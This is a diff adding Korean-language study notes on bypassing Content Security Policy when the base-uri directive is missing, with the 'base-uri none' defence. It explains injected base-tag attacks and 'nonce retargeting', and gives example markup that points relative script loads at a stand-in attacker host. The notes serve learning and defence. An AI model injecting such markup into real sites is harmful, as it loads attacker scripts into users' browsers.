@@ -109,6 +109,41 @@
 <br/><br/>
 
 ## CSP 우회: base-uri 미지정
+* HTML ```<base>``` 태그
+    - HTML 하이퍼링크에서 호스트 주소 없이 경로 지정 시 브라우저는 현재 문서를 기준으로 주소를 해석함 → **```<base>``` 태그로 경로가 해석되는 기준점을 변경할 수 있음**
+    - ```<a>```, ```<form>``` 등의 ```target``` 속성의 기본값을 지정함
+
+<br/>
+
+* ```<base>``` 태그를 이용한 공격 과정와 이를 방어하기 위한 정책 설정
+    - 공격 과정
+        | 순서 | 설명 |
+        |---|------|
+        | 01 | 공격자가 ```<base href="https://malice.test/xss-proxy/">```와 같은 마크업을 삽입함 |
+        | 02 | 이후 상대 경로를 사용하는 URL들은 **본래 의도한 위치가 아닌 공격자의 서버에 위치한 자원**을 가리키게 됨 <br/> &nbsp;&nbsp; → 공격자는 이를 통해 임의의 스크립트 등을 삽입할 수 있게 됨 |
+    - ```<base>``` 태그의 ```href``` 속성을 사용하지 않는 페이지의 경우 아래의 CSP 정책 지시문을 이용해 이러한 공격을 방어할 수 있음
+        ```
+        Content-Security-Policy: base-uri 'none'
+        ```
+        + ```<base>``` 태그의 URL은 어느 것도 허용하지 않도록(none) 하는 Policy Directive
+
+<br/>
+
+* **Nonce Retargeting**
+    - **```nonce``` CSP 구문을 지정했지만 ```base-uri``` CSP 구문을 지정하지 않은 경우** ```base``` 태그를 이용하여 임의 자원을 로드할 수 있음
+    - 예시: 페이지의 임의 마크업을 삽입할 수 있는 취약점이 있지만, ```nonce``` CSP 구문으로 인해 스크립트를 삽입할 수 없는 경우
+        ```html
+        <!-- base 태그로 이후 상대 경로를 지정한 URL들은 https://matlice.test에 위치한 자원을 가리키게 됨 -->
+        <base href="https://malice.test">
+
+        <!-- jquery.js는 base 태그로 인해 https://malice.test/jquery.js를 가리킴 -->
+        <script src="/jquery.js" nonce=NONCE>
+        ```
+
+<br/>
+
+* ⚠️ **```base-uri``` 지시문을 임의로 지정하지 않는 이상 ```default``` 초기값이 존재하지 않음**
+    - 웹 서비스를 개발할 때에는 **반드시 ```base-uri``` 지시문을 정의해 주어야 함**
 
 
 <br/><br/><br/><br/>
